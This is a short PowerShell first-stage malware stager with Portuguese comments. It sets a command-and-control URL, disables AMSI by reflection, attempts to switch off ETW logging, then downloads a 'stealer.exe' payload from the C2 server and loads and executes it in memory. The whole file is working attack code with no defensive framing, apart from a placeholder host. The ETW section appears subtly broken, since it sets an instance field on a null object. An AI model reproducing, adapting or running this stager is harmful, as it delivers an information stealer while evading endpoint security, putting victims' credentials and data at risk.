# Stage 1 - PowerShell Stager
# Baixa e executa o stealer principal em memória

$C2_URL = "https://your-c2-server.com"

# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ETW Bypass
$p = [System.Diagnostics.Process]::GetCurrentProcess()
$h = $p.Handle
$t = [AppDomain]::CurrentDomain.GetAssemblies()
foreach ($a in $t) {
    if ($a.GetName().Name -eq 'System.Core') {
        $t2 = $a.GetTypes()
        foreach ($t3 in $t2) {
            if ($t3.Name -eq 'EventProvider') {
                $f = $t3.GetField('m_enabled', 'NonPublic,Instance')
                $f.SetValue($null, 0)
            }
        }
    }
}

# Download e execução em memória
$stealer = (New-Object System.Net.WebClient).DownloadData("$C2_URL/payload/stealer.exe")
$assembly = [System.Reflection.Assembly]::Load($stealer)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, (, [string[]] ('', '')))